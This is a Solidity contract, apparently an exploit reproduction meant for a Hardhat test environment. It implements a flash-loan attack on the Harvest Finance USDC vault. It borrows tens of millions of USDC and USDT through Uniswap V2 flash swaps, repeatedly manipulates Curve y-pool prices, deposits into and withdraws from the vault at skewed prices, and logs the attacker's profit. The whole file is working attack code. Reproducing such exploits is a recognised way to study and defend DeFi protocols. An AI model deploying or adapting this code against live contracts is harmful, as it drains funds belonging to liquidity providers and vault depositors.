// SPDX-License-Identifier: MIT
pragma solidity ^0.8.1;

import "hardhat/console.sol";
import "./interfaces/interface.sol";
import "./constants/constants.sol";

contract ContractKiller {
    bool public isPwned;

    // Uniswap ETH/USDC LP (UNI-V2)
    IUniswapV2Pair usdcPair = IUniswapV2Pair(CONST_UNISWAP_V2_USDCPAIR);
    // Uniswap ETH/USDT LP (UNI-V2)
    IUniswapV2Pair usdtPair = IUniswapV2Pair(CONST_UNISWAP_V2_USDTPAIR);
    // Curve y swap
    IcurveYSwap curveYSwap = IcurveYSwap(CONST_CURVEYSWAP);
    // Harvest USDC pool
    IHarvestUsdcVault harvest = IHarvestUsdcVault(CONST_HARVEST_USDCPOOL);

    // ERC20s
    // 6 decimals on usdt
    IUSDT usdt = IUSDT(CONST_TOKENADDRESS_USDT);
    // 6 decimals on usdc
    IERC20 usdc = IERC20(CONST_TOKENADDRESS_USDC);
    // 6 decimals on yusdc
    IERC20 yusdc = IERC20(CONST_TOKENADDRESS_YUSDC);
    // 6 decimals on yusdt
    IERC20 yusdt = IERC20(CONST_TOKENADDRESS_YUSDT);
    // 6 decimals on fUSDT
    IERC20 fusdt = IERC20(CONST_TOKENADDRESS_FUSDT);
    // 6 decimals on fUSDC
    IERC20 fusdc = IERC20(CONST_TOKENADDRESS_FUSDC);

    // usdtLoan: used to swap for USDC in Curve, pushing USDC prices up
    uint256 usdtLoan = 17_300_000 * 10 ** 6;
    uint256 usdtRepayment = (usdtLoan * 100301) / 100000; // 0.3% fee

    // usdcLoan: used to deposit into Harvest to get LP tokens
    uint256 usdcLoan = 50_000_000 * 10 ** 6;
    uint256 usdcRepayment = (usdcLoan * 100301) / 100000; // 0.3% fee

    uint256 usdcBal;
    uint256 usdtBal;

    function pwn() public {
        usdt.approve(address(curveYSwap), type(uint256).max);
        usdc.approve(address(curveYSwap), type(uint256).max);
        usdc.approve(address(harvest), type(uint256).max);
        usdt.approve(address(usdtPair), type(uint256).max);
        usdc.approve(address(usdcPair), type(uint256).max);
        console.log(
            "Before exploitation, USDC balance of attacker:",
            usdc.balanceOf(address(this)) / 1e6
        );
        console.log(
            "Before exploitation, USDT balance of attacker:",
            usdt.balanceOf(address(this)) / 1e6
        );
        usdcPair.swap(usdcLoan, 0, address(this), "0x"); // 'uniswapV2Call' hook is called

        console.log(
            "After exploitation, USDC balance of attacker:",
            usdc.balanceOf(address(this)) / 1e6
        );
        console.log(
            "After exploitation, USDT balance of attacker:",
            usdt.balanceOf(address(this)) / 1e6
        );

        isPwned = true;
    }

    function uniswapV2Call(address, uint256, uint256, bytes calldata) external {
        if (msg.sender == address(usdcPair)) {
            console.log(
                "Flashswap, Amount of USDC received:",
                usdc.balanceOf(address(this)) / 1e6
            );
            usdtPair.swap(0, usdtLoan, address(this), "0x");
            bool usdcSuccess = usdc.transfer(address(usdcPair), usdcRepayment);
        }

        if (msg.sender == address(usdtPair)) {
            console.log(
                "Flashswap, Amount of USDT received:",
                usdt.balanceOf(address(this)) / 1e6
            );
            for (uint256 i = 0; i < 6; i++) {
                theSwap(i);
            }
            usdt.transfer(msg.sender, usdtRepayment);
        }
    }

    function theSwap(uint256 i) internal {
        curveYSwap.exchange_underlying(
            2,
            1,
            17200000 * 10 ** 6,
            17000000 * 10 ** 6
        );
        harvest.deposit(49000000000000);
        curveYSwap.exchange_underlying(
            1,
            2,
            17310000 * 10 ** 6,
            17000000 * 10 ** 6
        );
        harvest.withdraw(fusdc.balanceOf(address(this)));
        console.log(
            "After swap, USDC balance of attacker:",
            usdc.balanceOf(address(this)) / 1e6
        );
        console.log(
            "After swap, USDT balance of attacker:",
            usdt.balanceOf(address(this)) / 1e6
        );
    }

    receive() external payable {}
}
